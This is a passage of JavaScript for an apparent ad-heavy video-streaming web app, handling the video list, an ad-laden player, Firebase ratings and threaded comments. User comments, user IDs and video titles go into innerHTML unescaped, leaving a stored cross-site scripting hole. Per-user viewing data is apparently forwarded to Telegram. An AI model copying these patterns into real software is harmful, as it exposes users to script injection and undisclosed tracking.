        const videoDataObj = JSON.stringify({ id: v.id, title: v.title, url: v.url, thumb: v.thumb || "", top_ad_url: v.video_top_ad_url || "", ad_url: v.video_ad_url || "" }).replace(/"/g, '&quot;');
        
        container.innerHTML += `
        <div class="video-card" onclick="playPremiumVideo(${videoDataObj})">
            ${badgeHtml}
            <img class="video-thumb" src="${v.thumb || 'https://via.placeholder.com/150'}">
            <div class="video-info">
                <div class="video-title">${v.title}</div>
                <span class="upload-time-label"><i class="fa fa-clock"></i> ${timeString}</span>
                <div class="video-price"><i class="fa fa-unlock-keyhole"></i> ${languages[currentLang].freeRoom}</div>
            </div>
        </div>`;
    });

    updatePaginationControls();
}

function updatePaginationControls() {
    const totalPages = Math.ceil(filteredVideos.length / itemsPerPage) || 1;
    let currentLang = localStorage.getItem("app_lang") || "bn";
    let lblPage = document.getElementById('lbl-page-number');
    if(lblPage) lblPage.innerText = `${languages[currentLang].pageLabel}${currentPage} / ${totalPages}`;
    
    let btnPrev = document.getElementById('btn-prev-page');
    let btnNext = document.getElementById('btn-next-page');
    if(btnPrev) btnPrev.disabled = (currentPage === 1);
    if(btnNext) btnNext.disabled = (currentPage >= totalPages);
}

function changeVideoPage(direction) {
    currentPage += direction;
    displayVideosPage();
    if(document.getElementById('nav-home-section')) {
        document.getElementById('nav-home-section').scrollIntoView({ behavior: 'smooth' });
    }
}

function filterCategory(catId) {
    document.querySelectorAll('.cat-btn').forEach(btn => btn.classList.remove('active'));
    currentPage = 1;
    if(catId === 'all') {
        if(document.getElementById('cat-all')) document.getElementById('cat-all').classList.add('active');
        filteredVideos = [...allVideos];
    } else {
        if(document.getElementById(`cat-${catId}`)) document.getElementById(`cat-${catId}`).classList.add('active');
        filteredVideos = allVideos.filter(v => v.category_id === catId);
    }
    displayVideosPage();
}

function playPremiumVideo(video) {
    let selectedTopAd = globalAdCode;
    if(video.top_ad_url && video.top_ad_url !== "") selectedTopAd = video.top_ad_url;

    let selectedBottomAd = globalAdCode;
    if(video.ad_url && video.ad_url !== "") selectedBottomAd = video.ad_url;

    currentWatchingVideoTitle = video.title;
    videoStartTime = new Date();
    
    db.collection("user_profiles").doc(userId).update({
        videos_watched: firebase.firestore.FieldValue.increment(1)
    }).then(() => {
        sendOrUpdateTelegramReport(); 
    });

    if(document.getElementById('playing-video-title')) document.getElementById('playing-video-title').innerText = video.title;
    sessionStorage.setItem("is_player_open", "true");

    if(document.getElementById('main-app')) document.getElementById('main-app').style.display = 'none'; 
    if(document.getElementById('video-player-container')) document.getElementById('video-player-container').style.display = 'flex';

    if(document.getElementById('player-iframe-area')) {
        document.getElementById('player-iframe-area').innerHTML = `
            <video id="actual-premium-video" style="width:100%; height:100%;" playsinline>
                <source src="${video.url}" type="video/mp4">
            </video>`;
    }
    
    if (myFluidPlayer) {
        try { myFluidPlayer.destroy(); } catch(e) {}
    }

    const videoElement = document.getElementById('actual-premium-video');

    if(videoElement) {
        videoElement.addEventListener('loadedmetadata', function() {
            let durationSec = videoElement.duration;
            let adList = [];

            function getVastTagWithCacheBuster() {
                let baseZoneUrl = "https://s.magsrv.com/v1/vast.php?idz=5960830";
                let randomStr = Math.random().toString(36).substring(2, 15);
                return `${baseZoneUrl}&cb=${Date.now()}_${randomStr}`;
            }

            adList.push({ roll: 'preRoll', vastTag: getVastTagWithCacheBuster(), skipable: true, skipAdActivationTime: 10 });

            let totalMidAds = 2; 
            if (durationSec <= 300) { 
                adList.push({ roll: 'midRoll', timer: '00:02:00', vastTag: getVastTagWithCacheBuster(), skipable: true, skipAdActivationTime: 10 });
            } else {
                if (durationSec > 300 && durationSec <= 600) totalMidAds = 3;
                else if (durationSec > 600 && durationSec <= 1200) totalMidAds = 7;
                else if (durationSec > 1200) totalMidAds = 15;

                let interval = durationSec / (totalMidAds + 1);
                for (let i = 1; i <= totalMidAds; i++) {
                    let adTime = interval * i;
                    let m = Math.floor(adTime / 60).toString().padStart(2, '0');
                    let s = Math.floor(adTime % 60).toString().padStart(2, '0');
                    adList.push({ roll: 'midRoll', timer: `00:${m}:${s}`, vastTag: getVastTagWithCacheBuster(), skipable: true, skipAdActivationTime: 10 });
                }
            }

            myFluidPlayer = fluidPlayer('actual-premium-video', {
                layoutControls: { fillToContainer: true, autoPlay: true, mute: false, keyboardControl: true, allowDownload: false, playbackRateControl: false },
                vastOptions: { adList: adList, skipButtonCaption: 'Skip Ad in [caSec]', skipButtonClickCaption: 'Skip Ad', adClickable: true, allowVpaid: true }
            });
        });
    }

    renderAdCode('player-top-ad-wrapper', selectedTopAd);
    renderAdCode('player-bottom-ad-wrapper', selectedBottomAd);
    setTimeout(setupAdClickTracker, 500);
}

function closeVideoPlayer() {
    sessionStorage.removeItem("is_player_open");
    if(document.getElementById('video-player-container')) document.getElementById('video-player-container').style.display = 'none';
    if(document.getElementById('main-app')) document.getElementById('main-app').style.display = 'block'; 

    if (videoStartTime) {
        const videoEndTime = new Date();
        const diff = Math.round((videoEndTime - videoStartTime) / 1000);
        totalWatchDurationSeconds += diff; 
        db.collection("user_profiles").doc(userId).update({
            watch_duration: totalWatchDurationSeconds
        }).then(() => {
            sendOrUpdateTelegramReport(); 
        });
    }
    videoStartTime = null;

    if (myFluidPlayer) {
        try { myFluidPlayer.destroy(); } catch(e) {}
        myFluidPlayer = null;
    }

    if(document.getElementById('player-iframe-area')) document.getElementById('player-iframe-area').innerHTML = "";
    if(document.getElementById('player-top-ad-wrapper')) document.getElementById('player-top-ad-wrapper').innerHTML = "";
    if(document.getElementById('player-bottom-ad-wrapper')) document.getElementById('player-bottom-ad-wrapper').innerHTML = "";
}

function listenGlobalRatings() {
    db.collection("settings").doc("star_ratings").onSnapshot(doc => {
        let currentLang = localStorage.getItem("app_lang") || "bn";
        if(doc.exists) {
            const data = doc.data();
            let totalVotes = data.total_votes || 0;
            let totalPoints = data.total_points || 0;
            let average = totalVotes > 0 ? (totalPoints / totalVotes).toFixed(1) : "5.0";
            if(document.getElementById('lbl-rating-summary')) {
                document.getElementById('lbl-rating-summary').innerText = `⭐ ${average} (${totalVotes} ${currentLang === 'en' ? 'Reviews' : 'রিভিউ'})`;
            }
            highlightStars(Math.round(parseFloat(average)));
        } else {
            if(document.getElementById('lbl-rating-summary')) {
                document.getElementById('lbl-rating-summary').innerText = `⭐ 5.0 (0 ${currentLang === 'en' ? 'Reviews' : 'রিভিউ'})`;
            }
        }
    });
}

function highlightStars(rating) {
    const stars = document.querySelectorAll('#rating-star-row i');
    stars.forEach(star => {
        let v = parseInt(star.getAttribute('data-value'));
        if(v <= rating) { star.classList.add('active'); } else { star.classList.remove('active'); }
    });
}

function submitUserRating(starsValue) {
    if(localStorage.getItem("voted_stars")) { alert(localStorage.getItem("app_lang") === "en" ? "You have already reviewed!" : "আপনি অলরেডি রিভিউ দিয়েছেন!"); return; }
    highlightStars(starsValue);
    localStorage.setItem("voted_stars", starsValue);

    const ratingRef = db.collection("settings").doc("star_ratings");
    db.runTransaction((transaction) => {
        return transaction.get(ratingRef).then((sfDoc) => {
            let total_votes = 1, total_points = starsValue;
            if (sfDoc.exists) {
                total_votes = (sfDoc.data().total_votes || 0) + 1;
                total_points = (sfDoc.data().total_points || 0) + starsValue;
            }
            transaction.set(ratingRef, { total_votes, total_points });
            return { total_votes, total_points };
        });
    }).catch(err => console.error(err));
}

function listenGlobalComments() {
    db.collection("app_comments").orderBy("timestamp", "asc").onSnapshot(snap => {
        const container = document.getElementById('popup-comment-list-container');
        if(!container) return;
        let currentLang = localStorage.getItem("app_lang") || "bn";
        container.innerHTML = "";
        
        totalLoadedCommentsCount = snap.size;
        if(document.getElementById('lbl-total-comments-info')) {
            document.getElementById('lbl-total-comments-info').innerText = `${totalLoadedCommentsCount} ${currentLang === 'en' ? 'Comments' : 'টি কমেন্ট'}`;
        }

        if (!isCommentPopupOpen) {
            let unreadCount = totalLoadedCommentsCount - lastSeenCommentsCount;
            let badgeEl = document.getElementById('lbl-comment-badge');
            if (badgeEl) {
                if (unreadCount > 0) {
                    badgeEl.innerText = unreadCount;
                    badgeEl.style.display = "flex";
                } else {
                    badgeEl.style.display = "none";
                }
            }
        }

        let commentsMap = {};
        let rootComments = [];

        snap.forEach(doc => {
            let data = doc.data();
            let id = doc.id;
            commentsMap[id] = { id, idStr: id, replies: [], ...data };
            if (!data.reply_to) {
                rootComments.push(commentsMap[id]);
            } else {
                if (commentsMap[data.reply_to]) {
                    commentsMap[data.reply_to].replies.push({ id, ...data });
                }
            }
        });

        rootComments.reverse().forEach(c => {
            let timeStr = currentLang === 'en' ? "Just now" : "কিছুক্ষণ আগে";
            if(c.timestamp) {
                let d = c.timestamp.toDate ? c.timestamp.toDate() : new Date(c.timestamp);
                if(currentLang === 'en') {
                    timeStr = d.toLocaleTimeString('en-US', {hour: '2-digit', minute:'2-digit'});
                } else {
                    timeStr = d.toLocaleTimeString('bn-BD', {hour: '2-digit', minute:'2-digit'});
                }
            }

            let replyListHtml = "";
            c.replies.forEach(r => {
                replyListHtml += `
                    <div class="reply-item">
                        <div class="comment-meta">👑 ${r.user_id}</div>
                        <div class="comment-text">${r.text}</div>
                    </div>`;
            });

            container.innerHTML += `
                <div class="comment-item" id="comment-block-${c.id}">
                    <div class="comment-meta">👤 ${c.user_id} <span style="color:#555; font-weight:normal;">${timeStr}</span></div>
                    <div class="comment-text">${c.text}</div>
                    <button class="btn-reply-trigger" onclick="setCommentReplyTarget('${c.id}', '${c.user_id}')"><i class="fa fa-reply"></i> ${languages[currentLang].replyText}</button>
                    ${c.replies.length > 0 ? `<div class="reply-section">${replyListHtml}</div>` : ""}
                </div>`;
        });

        if(rootComments.length === 0) {
            container.innerHTML = `<p style='text-align:center; color:#555; padding-top:40px; font-size:13.5px;'>${languages[currentLang].noComments}</p>`;
        }
    });
}

function openCommentPopup() {
    isCommentPopupOpen = true;
    if(document.getElementById('global-comment-modal')) document.getElementById('global-comment-modal').style.display = 'flex';
    if(document.getElementById('lbl-comment-badge')) document.getElementById('lbl-comment-badge').style.display = 'none';
    lastSeenCommentsCount = totalLoadedCommentsCount;
    localStorage.setItem("last_seen_comments_count", lastSeenCommentsCount);
}

function closeCommentPopup() {
    isCommentPopupOpen = false;
    if(document.getElementById('global-comment-modal')) document.getElementById('global-comment-modal').style.display = 'none';
    resetCommentReplyTarget();
    lastSeenCommentsCount = totalLoadedCommentsCount;
    localStorage.setItem("last_seen_comments_count", lastSeenCommentsCount);
}

function closeCommentPopupOutside(e) {
    if (e.target.id === "global-comment-modal") { closeCommentPopup(); }
}

function setCommentReplyTarget(commentId, userName) {
    activeReplyToCommentId = commentId;
    let inputField = document.getElementById('txt-user-comment');
    if(!inputField) return;
    let currentLang = localStorage.getItem("app_lang") || "bn";
    inputField.placeholder = currentLang === 'en' ? `Reply to @${userName}...` : `@${userName} এর উত্তরে লিখুন...`;
    inputField.focus();
}

function resetCommentReplyTarget() {
    activeReplyToCommentId = null;
    let inputField = document.getElementById('txt-user-comment');
    if(!inputField) return;
    let currentLang = localStorage.getItem("app_lang") || "bn";
    inputField.placeholder = languages[currentLang].commentPlh;
}

function submitNewComment() {
    const inputField = document.getElementById('txt-user-comment');
    if(!inputField) return;
    const commentValue = inputField.value.trim();
    if (!commentValue) return;

    let commentPayload = {
        user_id: userId,
        text: commentValue,
        timestamp: firebase.firestore.FieldValue.serverTimestamp()
    };

    if (activeReplyToCommentId) { commentPayload.reply_to = activeReplyToCommentId; }

    db.collection("app_comments").add(commentPayload)
    .then(() => {
        inputField.value = "";
        resetCommentReplyTarget();
    })
    .catch(err => {
        console.error(err);
        alert(localStorage.getItem("app_lang") === "en" ? "Comment submission failed!" : "কমেন্ট সাবমিট ব্যর্থ হয়েছে!");
    });
}
